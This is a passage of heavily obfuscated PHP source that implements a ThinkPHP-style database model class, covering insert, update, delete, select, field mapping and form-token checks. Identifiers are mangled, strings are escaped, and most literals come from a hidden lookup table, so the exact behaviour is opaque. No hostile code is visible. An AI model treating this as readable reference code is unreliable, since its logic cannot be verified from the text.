implode($ñãÄìÅï[50] . PHP_EOL, $…Ùîüèª), $ñãÄìÅï[1150]); $ıóÏÈäÎ = implode(PHP_EOL, $Áïåü§ƒ); if ($ŞôÊü && $ŞôÊü == $ñãÄìÅï[806]) { return $ıóÏÈäÎ; } $­‚ŠÖÎ = array($ñãÄìÅï[806] => $ıóÏÈäÎ, $ñãÄìÅï[13] => $ÉãŸñŞ­); return $ŞôÊü ? $­‚ŠÖÎ[$ŞôÊü] : $­‚ŠÖÎ; } } goto C‹§ÆåéÉ¶; AŞË—°á‚ğ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\x65", "\x6f\x72\144\145\162", "\141\154\151\141\163", "\x68\141\x76\x69\156\147", "\147\x72\x6f\x75\160", "\154\157\143\x6b", "\x64\x69\x73\164\151\156\143\164", "\141\165\x74\x6f", "\146\x69\x6c\x74\x65\162", "\166\x61\154\x69\144\x61\x74\145", "\x72\x65\x73\165\154\x74", "\x62\151\x6e\144", "\164\157\x6b\145\x6e"); public function __construct($ÍÇ´œ» = '', $ı„ŠÊ³Ö = '', $ÒÇœüÚê = '') { $¶´ƒóÉô =& $_SERVER[Ì¥ŞÒ°£]; $this->_initialize(); if (!empty($ÍÇ´œ»)) { if (strpos($ÍÇ´œ», $¶´ƒóÉô[10])) { list($this->dbName, $this->name) = explode($¶´ƒóÉô[10], $ÍÇ´œ»); } else { $this->name = $ÍÇ´œ»; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ı„ŠÊ³Ö)) { $this->tablePrefix = $¶´ƒóÉô[12]; } elseif ($¶´ƒóÉô[12] != $ı„ŠÊ³Ö) { $this->tablePrefix = $ı„ŠÊ³Ö; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¶´ƒóÉô[244]); } $this->db(0, empty($this->connection) ? $ÒÇœüÚê : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ºÄÔ’Š… =& $_SERVER[Ì¥ŞÒ°£]; if (empty($this->fields)) { if (think_config($ºÄÔ’Š…[245])) { $©æÒèôÅ = $this->dbName ? $this->dbName : think_config($ºÄÔ’Š…[246]); $«À›‹¦ = think_var_cache($ºÄÔ’Š…[247] . strtolower(get_path_this($©æÒèôÅ) . $ºÄÔ’Š…[10] . $this->name)); if ($«À›‹¦) { $°ÑÕ¥° = think_config($ºÄÔ’Š…[248]); if (empty($°ÑÕ¥°) || $«À›‹¦[$ºÄÔ’Š…[249]] == $°ÑÕ¥°) { $this->fields = $«À›‹¦; return; } } } $this->flush(); } } public function flush() { $ôæğöøó =& $_SERVER[Ì¥ŞÒ°£]; $this->db->setModel($this->name); $€—‡Ãßä = $this->db->getFields($this->getTableName()); if (!$€—‡Ãßä) { return !1; } $this->fields = array_keys($€—‡Ãßä); $this->fields[$ôæğöøó[250]] = !1; foreach ($€—‡Ãßä as $¯ô“‘Á– => $½šñŠ©¯) { $öö¿×²¯[$¯ô“‘Á–] = $½šñŠ©¯[$ôæğöøó[33]]; if ($½šñŠ©¯[$ôæğöøó[39]]) { $this->fields[$ôæğöøó[251]] = $¯ô“‘Á–; if ($½šñŠ©¯[$ôæğöøó[42]]) { $this->fields[$ôæğöøó[250]] = !0; } } } $this->fields[$ôæğöøó[252]] = $öö¿×²¯; if (think_config($ôæğöøó[248])) { $this->fields[$ôæğöøó[249]] = think_config($ôæğöøó[248]); } if (think_config($ôæğöøó[245])) { $®øçççŒ = $this->dbName ? $this->dbName : think_config($ôæğöøó[246]); think_var_cache($ôæğöøó[247] . strtolower(get_path_this($®øçççŒ) . $ôæğöøó[10] . $this->name), $this->fields); } } public function switchModel($ø–ì˜¦, $Î°Îûšƒ = array()) { $¥¢ì¾şˆ =& $_SERVER[Ì¥ŞÒ°£]; $“ÙİÁäÅ = ucwords(strtolower($ø–ì˜¦)) . $¥¢ì¾şˆ[253]; if (!class_exists($“ÙİÁäÅ)) { think_exception($“ÙİÁäÅ . think_lang($¥¢ì¾şˆ[254])); } $this->_extModel = new $“ÙİÁäÅ($this->name); if (!empty($Î°Îûšƒ)) { foreach ($Î°Îûšƒ as $êì·‹½Ë) { $this->_extModel->setProperty($êì·‹½Ë, $this->{$êì·‹½Ë}); } } return $this->_extModel; } public function __set($ºïšˆŒ, $ïŞÜô”Œ) { $this->data[$ºïšˆŒ] = $ïŞÜô”Œ; } public function __get($šÇåÌİï) { return isset($this->data[$šÇåÌİï]) ? $this->data[$šÇåÌİï] : null; } public function __isset($ÇÆö˜‚ƒ) { return isset($this->data[$ÇÆö˜‚ƒ]); } public function __unset($£«Ü°„´) { unset($this->data[$£«Ü°„´]); } public function __call($”‹Ë¬·”, $¿ÛÊ¹ø¨) { $°áíòÖù =& $_SERVER[Ì¥ŞÒ°£]; if (in_array(strtolower($”‹Ë¬·”), $this->methods, !0)) { $this->options[strtolower($”‹Ë¬·”)] = $¿ÛÊ¹ø¨[0]; return $this; } elseif (in_array(strtolower($”‹Ë¬·”), array($°áíòÖù[255], $°áíòÖù[256], $°áíòÖù[257], $°áíòÖù[258], $°áíòÖù[259]), !0)) { $ˆ–àò‘í = isset($¿ÛÊ¹ø¨[0]) ? $¿ÛÊ¹ø¨[0] : $°áíòÖù[188]; $ˆ–àò‘í = $this->db->parseKey($ˆ–àò‘í); return $this->getField(strtoupper($”‹Ë¬·”) . $°áíòÖù[260] . $ˆ–àò‘í . $°áíòÖù[261] . $”‹Ë¬·”, $°áíòÖù[255]); } elseif (strtolower(substr($”‹Ë¬·”, 0, 5)) == $°áíòÖù[262]) { $ˆ–àò‘í = think_parse_name(substr($”‹Ë¬·”, 5)); $¯´üë´[$ˆ–àò‘í] = $¿ÛÊ¹ø¨[0]; return $this->where($¯´üë´)->find(); } elseif (strtolower(substr($”‹Ë¬·”, 0, 10)) == $°áíòÖù[263]) { $»„óöÄ = think_parse_name(substr($”‹Ë¬·”, 10)); $¯´üë´[$»„óöÄ] = $¿ÛÊ¹ø¨[0]; return $this->where($¯´üë´)->getField($¿ÛÊ¹ø¨[1]); } elseif (isset($this->_scope[$”‹Ë¬·”])) { return $this->scope($”‹Ë¬·”, $¿ÛÊ¹ø¨[0]); } elseif (method_exists($this, $”‹Ë¬·”)) { array_unshift($¿ÛÊ¹ø¨, $”‹Ë¬·”); return call_user_func_array(array($this, $°áíòÖù[264]), $¿ÛÊ¹ø¨); } else { return call_user_func_array(array(parent, $”‹Ë¬·”), $¿ÛÊ¹ø¨); } } protected function call() { $ÉØÀÆëÑ =& $_SERVER[Ì¥ŞÒ°£]; $½ä³ş = func_get_args(); $©ÄëÃÏ… = array_shift($½ä³ş); $‰ô”í = $©ÄëÃÏ…; if (is_array($©ÄëÃÏ…)) { $‰ô”í = $©ÄëÃÏ…[1]; $©ÄëÃÏ… = $©ÄëÃÏ…[0]; } $âÃĞÌÓ = count($½ä³ş) - 1; if (isset($½ä³ş[$âÃĞÌÓ]) && $½ä³ş[$âÃĞÌÓ] === $©ÄëÃÏ…) { think_exception(__CLASS__ . $ÉØÀÆëÑ[4] . $©ÄëÃÏ… . think_lang($ÉØÀÆëÑ[265])); return; } $½ä³ş[] = $©ÄëÃÏ…; if (method_exists($this, $ÉØÀÆëÑ[266])) { $¹Ó¬ı®× = call_user_func_array(array($this, $ÉØÀÆëÑ[267]), array($‰ô”í, $½ä³ş)); if (!is_null($¹Ó¬ı®×) && $¹Ó¬ı®× !== !1) { return $¹Ó¬ı®×; } } $¤¸İ‡¸¡ = call_user_func_array(array($this, $©ÄëÃÏ…), $½ä³ş); if (method_exists($this, $ÉØÀÆëÑ[268])) { $¹Ó¬ı®× = call_user_func_array(array($this, $ÉØÀÆëÑ[269]), array($‰ô”í, $½ä³ş, $¤¸İ‡¸¡)); if ($¹Ó¬ı®×) { return $¹Ó¬ı®×; } } return $¤¸İ‡¸¡; } protected function _initialize() { } protected function _facade($–¡Õ¯Åû) { $’‹Í¬ø =& $_SERVER[Ì¥ŞÒ°£]; if (!empty($this->fields)) { foreach ($–¡Õ¯Åû as $¬ù±ÅŞ® => $¤ºØ€ÓĞ) { if (is_array($this->fields) && !in_array($¬ù±ÅŞ®, $this->fields, !0)) { unset($–¡Õ¯Åû[$¬ù±ÅŞ®]); } elseif (is_scalar($¤ºØ€ÓĞ)) { $this->_parseType($–¡Õ¯Åû, $¬ù±ÅŞ®); } } } if (!empty($this->options[$’‹Í¬ø[270]])) { $–¡Õ¯Åû = array_map($this->options[$’‹Í¬ø[270]], $–¡Õ¯Åû); unset($this->options[$’‹Í¬ø[270]]); } $this->_beforeWrite($–¡Õ¯Åû); return $–¡Õ¯Åû; } protected function _beforeWrite(&$¶î¡ıÖ) { } public function add($íúúÙ² = '', $¦ˆƒ¿„¬ = array(), $øø†ûèê = false) { if (empty($íúúÙ²)) { if (!empty($this->data)) { $íúúÙ² = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ì¥ŞÒ°£][271]); return !1; } } $¦ˆƒ¿„¬ = $this->_parseOptions($¦ˆƒ¿„¬); $íúúÙ² = $this->_facade($íúúÙ²); if (!1 === $this->_beforeInsert($íúúÙ², $¦ˆƒ¿„¬)) { return !1; } $°ä¤ò“ = $this->db->insert($íúúÙ², $¦ˆƒ¿„¬, $øø†ûèê); if (!1 !== $°ä¤ò“) { $ÈùÈ˜îÀ = $this->getLastInsID(); if ($ÈùÈ˜îÀ) { $íúúÙ²[$this->getPk()] = $ÈùÈ˜îÀ; $this->_after_insert($íúúÙ², $¦ˆƒ¿„¬); return $ÈùÈ˜îÀ; } $this->_after_insert($íúúÙ², $¦ˆƒ¿„¬); } return $°ä¤ò“; } protected function _beforeInsert(&$Â©áª®, $üò·•ßŠ) { } protected function _after_insert($íÊº·­ı, $å§†’Ûí) { } public function addAll($ŒÓ—Ù«“, $ÄĞ®™­ã = array(), $˜èşà÷¥ = false) { $Õ´Î˜¨¶ =& $_SERVER[Ì¥ŞÒ°£]; if (empty($ŒÓ—Ù«“)) { $this->error = think_lang($Õ´Î˜¨¶[271]); return !1; } $ÄĞ®™­ã = $this->_parseOptions($ÄĞ®™­ã); foreach ($ŒÓ—Ù«“ as $“ñİÈ­« => $ÖÓó¢íÉ) { $ŒÓ—Ù«“[$“ñİÈ­«] = $this->_facade($ÖÓó¢íÉ); } if (method_exists($this->db, $Õ´Î˜¨¶[272])) { $Ú¤å˜¨§ = $this->db->insertAll($ŒÓ—Ù«“, $ÄĞ®™­ã, $˜èşà÷¥); } else { $this->startTrans(); foreach ($ŒÓ—Ù«“ as $“ñİÈ­« => $ÖÓó¢íÉ) { $Ú¤å˜¨§ = $this->db->insert($ÖÓó¢íÉ, $ÄĞ®™­ã, $˜èşà÷¥); } $this->commit(); } if (!1 !== $Ú¤å˜¨§) { $‚×å¤Ğ = $this->getLastInsID(); if ($‚×å¤Ğ) { return $‚×å¤Ğ; } } return $Ú¤å˜¨§; } public function selectAdd($ŠŞê§ƒµ = '', $²›èöâ± = '', $œğÚÙµä = array()) { $‹ÎªÉóş =& $_SERVER[Ì¥ŞÒ°£]; $œğÚÙµä = $this->_parseOptions($œğÚÙµä); if (!1 === ($Â€®™µì = $this->db->selectInsert($ŠŞê§ƒµ ? $ŠŞê§ƒµ : $œğÚÙµä[$‹ÎªÉóş[273]], $²›èöâ± ? $²›èöâ± : $this->getTableName(), $œğÚÙµä))) { $this->error = think_lang($‹ÎªÉóş[274]); return !1; } else { return $Â€®™µì; } } public function save($Ï³ÌÌÜÙ = '', $„µ³ìãŠ = array()) { $­¶³­ÇÚ =& $_SERVER[Ì¥ŞÒ°£]; if (empty($Ï³ÌÌÜÙ)) { if (!empty($this->data)) { $Ï³ÌÌÜÙ = $this->data; $this->data = array(); } else { $this->error = think_lang($­¶³­ÇÚ[271]); return !1; } } $Ï³ÌÌÜÙ = $this->_facade($Ï³ÌÌÜÙ); $„µ³ìãŠ = $this->_parseOptions($„µ³ìãŠ); $Ìñîğß = $this->getPk(); if (!isset($„µ³ìãŠ[$­¶³­ÇÚ[275]])) { if (isset($Ï³ÌÌÜÙ[$Ìñîğß])) { $õíƒìÒ[$Ìñîğß] = $Ï³ÌÌÜÙ[$Ìñîğß]; $„µ³ìãŠ[$­¶³­ÇÚ[275]] = $õíƒìÒ; unset($Ï³ÌÌÜÙ[$Ìñîğß]); } else { $this->error = think_lang($­¶³­ÇÚ[274]); return !1; } } if (is_array($„µ³ìãŠ[$­¶³­ÇÚ[275]]) && isset($„µ³ìãŠ[$­¶³­ÇÚ[275]][$Ìñîğß])) { $Á¸±˜Æ = $„µ³ìãŠ[$­¶³­ÇÚ[275]][$Ìñîğß]; } if (!1 === $this->_beforeUpdate($Ï³ÌÌÜÙ, $„µ³ìãŠ)) { return !1; } $Ğš­˜â = $this->db->update($Ï³ÌÌÜÙ, $„µ³ìãŠ); if (!1 !== $Ğš­˜â) { if (isset($Á¸±˜Æ)) { $Ï³ÌÌÜÙ[$Ìñîğß] = $Á¸±˜Æ; } $this->_afterUpdate($Ï³ÌÌÜÙ, $„µ³ìãŠ); } return $Ğš­˜â; } protected function _beforeUpdate(&$†ùŒå¥¶, $ã¶Š) { } protected function _afterUpdate($‚·¾Ñ¨õ, $òÔ†²‹ã) { } public function delete($©ö´ÔŞ« = array()) { $³÷á¡Ôˆ =& $_SERVER[Ì¥ŞÒ°£]; if (empty($©ö´ÔŞ«) && empty($this->options[$³÷á¡Ôˆ[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ûš€÷ = $this->getPk(); if (is_numeric($©ö´ÔŞ«) || is_string($©ö´ÔŞ«)) { if (strpos($©ö´ÔŞ«, $³÷á¡Ôˆ[50])) { $Üù·ÈßË[$ûš€÷] = array($³÷á¡Ôˆ[276], $©ö´ÔŞ«); } else { $Üù·ÈßË[$ûš€÷] = $©ö´ÔŞ«; } $this->options[$³÷á¡Ôˆ[275]] = $Üù·ÈßË; } $©ö´ÔŞ« = $this->_parseOptions(); if (is_array($©ö´ÔŞ«[$³÷á¡Ôˆ[275]]) && isset($©ö´ÔŞ«[$³÷á¡Ôˆ[275]][$ûš€÷])) { $ °é„ñâ = $©ö´ÔŞ«[$³÷á¡Ôˆ[275]][$ûš€÷]; } $ÓùÇğñ³ = $this->db->delete($©ö´ÔŞ«); if (!1 !== $ÓùÇğñ³) { $¶ÆÁÓõÂ = array(); if (isset($ °é„ñâ)) { $¶ÆÁÓõÂ[$ûš€÷] = $ °é„ñâ; } $this->_after_delete($¶ÆÁÓõÂ, $©ö´ÔŞ«); } return $ÓùÇğñ³; } protected function _after_delete($Ï­”¨êó, $ãĞĞ£îª) { } public function select($ÂíÄûıç = array()) { $²ÕÜ÷¤ì =& $_SERVER[Ì¥ŞÒ°£]; if (is_string($ÂíÄûıç) || is_numeric($ÂíÄûıç)) { $®™ÇŒÆÌ = $this->getPk(); if (strpos($ÂíÄûıç, $²ÕÜ÷¤ì[50])) { $õÚÁ÷å³[$®™ÇŒÆÌ] = array($²ÕÜ÷¤ì[276], $ÂíÄûıç); } else { $õÚÁ÷å³[$®™ÇŒÆÌ] = $ÂíÄûıç; } $this->options[$²ÕÜ÷¤ì[275]] = $õÚÁ÷å³; } elseif (!1 === $ÂíÄûıç) { $ÂíÄûıç = $this->_parseOptions(); return $²ÕÜ÷¤ì[277] . $this->db->buildSelectSql($ÂíÄûıç) . $²ÕÜ÷¤ì[278]; } $ÂíÄûıç = $this->_parseOptions(); $”´äÄá = $this->db->select($ÂíÄûıç); if (!1 === $”´äÄá) { return !1; } if (empty($”´äÄá)) { return null; } $this->_afterSelect($”´äÄá, $ÂíÄûıç); return $”´äÄá; } protected function _afterSelect(&$Ôàôí„™, $×½à½ê•) { } public function buildSql($¾˜ƒÈ¼ = array()) { $ù€Éƒï =& $_SERVER[Ì¥ŞÒ°£]; $¾˜ƒÈ¼ = $this->_parseOptions($¾˜ƒÈ¼); return $ù€Éƒï[277] . $this->db->buildSelectSql($¾˜ƒÈ¼) . $ù€Éƒï[278]; } public function optionsValue($ ·Ø²­İ = null) { if (is_null($ ·Ø²­İ)) { return $this->options; } elseif (is_array($ ·Ø²­İ)) { $this->options = array_merge($this->options, $ ·Ø²­İ); } } protected function _parseOptions($şË²ÀïŒ = array()) { $¯Ûû¯Æ¸ =& $_SERVER[Ì¥ŞÒ°£]; if (is_array($şË²ÀïŒ)) { $şË²ÀïŒ = array_merge($this->options, $şË²ÀïŒ); } $this->options = array(); if (!isset($şË²ÀïŒ[$¯Ûû¯Æ¸[279]])) { $şË²ÀïŒ[$¯Ûû¯Æ¸[279]] = $this->getTableName(); $æôú¼Ö„ = $this->fields; } else { $æôú¼Ö„ = $this->getDbFields(); } if (!empty($şË²ÀïŒ[$¯Ûû¯Æ¸[280]])) { $şË²ÀïŒ[$¯Ûû¯Æ¸[279]] .= $¯Ûû¯Æ¸[53] . $şË²ÀïŒ[$¯Ûû¯Æ¸[280]]; } $şË²ÀïŒ[$¯Ûû¯Æ¸[281]] = $this->name; if (isset($şË²ÀïŒ[$¯Ûû¯Æ¸[275]]) && is_array($şË²ÀïŒ[$¯Ûû¯Æ¸[275]]) && !empty($æôú¼Ö„) && !isset($şË²ÀïŒ[$¯Ûû¯Æ¸[282]]) && !isset($şË²ÀïŒ[$¯Ûû¯Æ¸[279]])) { foreach ($şË²ÀïŒ[$¯Ûû¯Æ¸[275]] as $ô¬ëò° => $Ş–‰Ç‹á) { $ô¬ëò° = trim($ô¬ëò°); if (in_array($ô¬ëò°, $æôú¼Ö„, !0)) { if (is_scalar($Ş–‰Ç‹á)) { $this->_parseType($şË²ÀïŒ[$¯Ûû¯Æ¸[275]], $ô¬ëò°); } } elseif (!is_numeric($ô¬ëò°) && $¯Ûû¯Æ¸[11] != substr($ô¬ëò°, 0, 1) && !1 === strpos($ô¬ëò°, $¯Ûû¯Æ¸[10]) && !1 === strpos($ô¬ëò°, $¯Ûû¯Æ¸[260]) && !1 === strpos($ô¬ëò°, $¯Ûû¯Æ¸[283]) && !1 === strpos($ô¬ëò°, $¯Ûû¯Æ¸[284])) { unset($şË²ÀïŒ[$¯Ûû¯Æ¸[275]][$ô¬ëò°]); } } } $this->_options_filter($şË²ÀïŒ); return $şË²ÀïŒ; } protected function _options_filter(&$Àçßû™à) { } protected function _parseType(&$‚ƒİÇİ³, $ë°Á•¬æ) { $”Ì±ÆŠ¸ =& $_SERVER[Ì¥ŞÒ°£]; if (empty($this->options[$”Ì±ÆŠ¸[285]][$”Ì±ÆŠ¸[4] . $ë°Á•¬æ])) { $ıîÜ¥¬Û = strtolower($this->fields[$”Ì±ÆŠ¸[252]][$ë°Á•¬æ]); if (!1 !== strpos($ıîÜ¥¬Û, $”Ì±ÆŠ¸[286])) { } elseif (!1 === strpos($ıîÜ¥¬Û, $”Ì±ÆŠ¸[287]) && !1 !== strpos($ıîÜ¥¬Û, $”Ì±ÆŠ¸[288])) { $‚ƒİÇİ³[$ë°Á•¬æ] = intval($‚ƒİÇİ³[$ë°Á•¬æ]); } elseif (!1 !== strpos($ıîÜ¥¬Û, $”Ì±ÆŠ¸[289]) || !1 !== strpos($ıîÜ¥¬Û, $”Ì±ÆŠ¸[290])) { $‚ƒİÇİ³[$ë°Á•¬æ] = floatval($‚ƒİÇİ³[$ë°Á•¬æ]); } elseif (!1 !== strpos($ıîÜ¥¬Û, $”Ì±ÆŠ¸[291])) { $‚ƒİÇİ³[$ë°Á•¬æ] = (bool) $‚ƒİÇİ³[$ë°Á•¬æ]; } } } public function find($ëĞè‰ìÇ = array()) { $Âœşçúı =& $_SERVER[Ì¥ŞÒ°£]; if (is_numeric($ëĞè‰ìÇ) || is_string($ëĞè‰ìÇ)) { $ì“ÂŸ[$this->getPk()] = intval($ëĞè‰ìÇ); $this->options[$Âœşçúı[275]] = $ì“ÂŸ; } $this->options[$Âœşçúı[292]] = 1; $ëĞè‰ìÇ = $this->_parseOptions(); $ªşáˆşÊ = $this->db->select($ëĞè‰ìÇ); if (!1 === $ªşáˆşÊ) { return !1; } if (empty($ªşáˆşÊ)) { return null; } $this->data = $ªşáˆşÊ[0]; $this->_afterFind($this->data, $ëĞè‰ìÇ); if (!empty($this->options[$Âœşçúı[293]])) { return $this->returnResult($this->data, $this->options[$Âœşçúı[293]]); } return $this->data; } protected function _afterFind(&$„­¾ñãõ, $½ú›¿´š) { } protected function returnResult($Œ“Î÷Éæ, $§ä÷ó = '') { $°şŞ¸ì =& $_SERVER[Ì¥ŞÒ°£]; if ($§ä÷ó) { if (is_callable($§ä÷ó)) { return call_user_func($§ä÷ó, $Œ“Î÷Éæ); } switch (strtolower($§ä÷ó)) { case $°şŞ¸ì[294]: return json_encode($Œ“Î÷Éæ); case $°şŞ¸ì[295]: return xml_encode($Œ“Î÷Éæ); } } return $Œ“Î÷Éæ; } public function parseFieldsMap($…õ×§”ğ, $ôµ–Áİ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÖÜ¹ÆÊ× => $ªƒ˜ß£) { if ($ôµ–Áİ == 1) { if (isset($…õ×§”ğ[$ªƒ˜ß£])) { $…õ×§”ğ[$ÖÜ¹ÆÊ×] = $…õ×§”ğ[$ªƒ˜ß£]; unset($…õ×§”ğ[$ªƒ˜ß£]); } } else { if (isset($…õ×§”ğ[$ÖÜ¹ÆÊ×])) { $…õ×§”ğ[$ªƒ˜ß£] = $…õ×§”ğ[$ÖÜ¹ÆÊ×]; unset($…õ×§”ğ[$ÖÜ¹ÆÊ×]); } } } } return $…õ×§”ğ; } public function setField($Ùç•ÅİĞ, $Êºª ó‘ = '') { if (is_array($Ùç•ÅİĞ)) { $ğ®ÌñÂ = $Ùç•ÅİĞ; } else { $ğ®ÌñÂ[$Ùç•ÅİĞ] = $Êºª ó‘; } return $this->save($ğ®ÌñÂ); } public function setAdd($¶§¨¿Áø, $„”‚şÅé = 1) { $•îéŸó’ =& $_SERVER[Ì¥ŞÒ°£]; $õâ—§ÒÎ = $¶§¨¿Áø . $•îéŸó’[296] . $„”‚şÅé; if ($„”‚şÅé < 0) { $õâ—§ÒÎ = $¶§¨¿Áø . $„”‚şÅé; } return $this->setField($¶§¨¿Áø, array($•îéŸó’[297], $õâ—§ÒÎ)); } public function getField($á‹şÁ, $”‹×ûôú = null) { $ì¿â¤”Ú =& $_SERVER[Ì¥ŞÒ°£]; $†¿ÒÎšî[$ì¿â¤”Ú[273]] = $á‹şÁ; $†¿ÒÎšî = $this->_parseOptions($†¿ÒÎšî); $á‹şÁ = trim($á‹şÁ); if (strpos($á‹şÁ, $ì¿â¤”Ú[50])) { if (!isset($†¿ÒÎšî[$ì¿â¤”Ú[292]])) { $†¿ÒÎšî[$ì¿â¤”Ú[292]] = is_numeric($”‹×ûôú) ? $”‹×ûôú : $ì¿â¤”Ú[12]; } $…çéÄ× = $this->db->select($†¿ÒÎšî); if (!empty($…çéÄ×)) { $¶ºüÛôĞ = explode($ì¿â¤”Ú[50], $á‹şÁ); $á‹şÁ = array_keys($…çéÄ×[0]); $ â®Á¯ = array_shift($á‹şÁ); $µÂ„ó© = array_shift($á‹şÁ); $‰“ÌãŠó = array(); $¸Å•£ÚÎ = count($¶ºüÛôĞ); foreach ($…çéÄ× as $ìÚ˜çå¯) { $øßíÖîŞ = $ìÚ˜çå¯[$ â®Á¯]; if (2 == $¸Å•£ÚÎ) { $‰“ÌãŠó[$øßíÖîŞ] = $ìÚ˜çå¯[$µÂ„ó©]; } else { $‰“ÌãŠó[$øßíÖîŞ] = is_string($”‹×ûôú) ? implode($”‹×ûôú, $ìÚ˜çå¯) : $ìÚ˜çå¯; } } return $‰“ÌãŠó; } } else { if (!0 !== $”‹×ûôú) { $†¿ÒÎšî[$ì¿â¤”Ú[292]] = is_numeric($”‹×ûôú) ? $”‹×ûôú : 1; } if ($”‹×ûôú === $ì¿â¤”Ú[255]) { unset($†¿ÒÎšî[$ì¿â¤”Ú[292]]); } $ìÚ˜çå¯ = $this->db->select($†¿ÒÎšî); if (!empty($ìÚ˜çå¯)) { if ($”‹×ûôú === $ì¿â¤”Ú[255]) { return reset($ìÚ˜çå¯[0]); } if (!0 !== $”‹×ûôú && 1 == $†¿ÒÎšî[$ì¿â¤”Ú[292]]) { return reset($ìÚ˜çå¯[0]); } foreach ($ìÚ˜çå¯ as $·ÉÈÀØ§) { $“–¯õİ‰[] = $·ÉÈÀØ§[$á‹şÁ]; } return $“–¯õİ‰; } } return null; } public function create($ªçÍ›ş = '', $å ü°ñ = '') { $Äò‡®ï =& $_SERVER[Ì¥ŞÒ°£]; if (empty($ªçÍ›ş)) { $ªçÍ›ş = $_POST; } elseif (is_object($ªçÍ›ş)) { $ªçÍ›ş = get_object_vars($ªçÍ›ş); } if (empty($ªçÍ›ş) || !is_array($ªçÍ›ş)) { $this->error = think_lang($Äò‡®ï[271]); return !1; } $ªçÍ›ş = $this->parseFieldsMap($ªçÍ›ş, 0); $å ü°ñ = $å ü°ñ ? $å ü°ñ : (!empty($ªçÍ›ş[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Äò‡®ï[273]])) { $“ğ§Œà = $this->options[$Äò‡®ï[273]]; unset($this->options[$Äò‡®ï[273]]); } elseif ($å ü°ñ == THINK_MODEL_INSERT && isset($this->insertFields)) { $“ğ§Œà = $this->insertFields; } elseif ($å ü°ñ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $“ğ§Œà = $this->updateFields; } if (isset($“ğ§Œà)) { if (is_string($“ğ§Œà)) { $“ğ§Œà = explode($Äò‡®ï[50], $“ğ§Œà); } if (think_config($Äò‡®ï[298])) { $“ğ§Œà[] = think_config($Äò‡®ï[299]); } foreach ($ªçÍ›ş as $–ˆ­Õ˜¼ => $òş­¡ì‰) { if (!in_array($–ˆ­Õ˜¼, $“ğ§Œà)) { unset($ªçÍ›ş[$–ˆ­Õ˜¼]); } } } if (!$this->autoValidation($ªçÍ›ş, $å ü°ñ)) { return !1; } if (!$this->autoCheckToken($ªçÍ›ş)) { $this->error = think_lang($Äò‡®ï[300]); return !1; } if ($this->autoCheckFields) { $“ğ§Œà = $this->getDbFields(); foreach ($ªçÍ›ş as $–ˆ­Õ˜¼ => $òş­¡ì‰) { if (!in_array($–ˆ­Õ˜¼, $“ğ§Œà)) { unset($ªçÍ›ş[$–ˆ­Õ˜¼]); } elseif (MAGIC_QUOTES_GPC && is_string($òş­¡ì‰)) { $ªçÍ›ş[$–ˆ­Õ˜¼] = stripslashes($òş­¡ì‰); } } } $this->autoOperation($ªçÍ›ş, $å ü°ñ); $this->data = $ªçÍ›ş; return $ªçÍ›ş; } public function autoCheckToken($¶Î£İÒ) { $•à”Òº† =& $_SERVER[Ì¥ŞÒ°£]; if (isset($this->options[$•à”Òº†[301]]) && !$this->options[$•à”Òº†[301]]) { return !0; } if (think_config($•à”Òº†[298])) { $èî›Ï = think_config($•à”Òº†[299]); if (!isset($¶Î£İÒ[$èî›Ï]) || Session::get($èî›Ï)) { return !1; } list($æÀíËÚ‰, $‰§¯†ç) = explode($•à”Òº†[11], $¶Î£İÒ[$èî›Ï]); if ($‰§¯†ç && Session::get($èî›Ï . $•à”Òº†[10] . $æÀíËÚ‰) === $‰§¯†ç) { Session::remove($èî›Ï . $•à”Òº†[10] . $æÀíËÚ‰); return !0; } if (think_config($•à”Òº†[302])) { Session::remove($èî›Ï . $•à”Òº†[10] . $æÀíËÚ‰); } return !1; } return !0; } public function regex($á¼š¤ƒĞ, $¼Úûî»Ã) { $í›’Ò˜ó =& $_SERVER[Ì¥ŞÒ°£]; $±•óäÔ¥ = array($í›’Ò˜ó[303] => $í›’Ò˜ó[304], $í›’Ò˜ó[305] => $í›’Ò˜ó[306], $í›’Ò˜ó[307] => $í›’Ò˜ó[308], $í›’Ò˜ó[309] => $í›’Ò˜ó[310], $í›’Ò˜ó[311] => $í›’Ò˜ó[312], $í›’Ò˜ó[313] => $í›’Ò˜ó[314], $í›’Ò˜ó[315] => $í›’Ò˜ó[316], $í›’Ò˜ó[290] => $í›’Ò˜ó[317], $í›’Ò˜ó[318] => $í›’Ò˜ó[319]); if (isset($±•óäÔ¥[strtolower($¼Úûî»Ã)])) { $¼Úûî»Ã = $±•óäÔ¥[strtolower($¼Úûî»Ã)]; } return preg_match($¼Úûî»Ã, $á¼š¤ƒĞ) === 1; } private function autoOperation(&$’Íáè’­, $˜Èæï‹) { $îâÊÁêç =& $_SERVER[Ì¥ŞÒ°£]; if (!empty($this->options[$îâÊÁêç[320]])) { $Ã·è ¨ = $this->options[$îâÊÁêç[320]]; unset($this->options[$îâÊÁêç[320]]); } elseif (!empty($this->_auto)) { $Ã·è ¨ = $this->_auto; } if (isset($Ã·è ¨)) { foreach ($Ã·è ¨ as $Ü€¶ÎœÌ) { if (empty($Ü€¶ÎœÌ[2])) { $Ü€¶ÎœÌ[2] = THINK_MODEL_INSERT; } if ($˜Èæï‹ == $Ü€¶ÎœÌ[2] || $Ü€¶ÎœÌ[2] == THINK_MODEL_BOTH) { switch (trim($Ü€¶ÎœÌ[3])) { case $îâÊÁêç[321]: case $îâÊÁêç[322]: $«ä¬Â = isset($Ü€¶ÎœÌ[4]) ? (array) $Ü€¶ÎœÌ[4] : array(); if (isset($’Íáè’­[$Ü€¶ÎœÌ[0]])) { array_unshift($«ä¬Â, 